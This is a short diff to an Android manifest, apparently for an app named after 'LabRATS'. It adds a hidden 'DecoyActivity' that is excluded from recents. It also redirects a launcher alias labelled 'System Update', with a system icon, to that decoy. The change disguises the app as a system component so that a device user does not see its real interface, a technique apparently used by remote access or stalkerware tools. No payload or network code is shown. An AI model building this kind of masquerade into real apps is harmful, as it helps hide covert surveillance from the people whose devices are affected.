@@ -87,6 +87,13 @@
             android:theme="@style/Theme.LabRATS">
         </activity>
 
+        <activity
+            android:name=".DecoyActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+        </activity>
+
         <activity-alias
             android:name=".LauncherAlias"
             android:enabled="true"
@@ -106,7 +113,7 @@
             android:exported="true"
             android:label="System Update"
             android:icon="@android:drawable/ic_menu_manage"
-            android:targetActivity=".MainActivity">
+            android:targetActivity=".DecoyActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
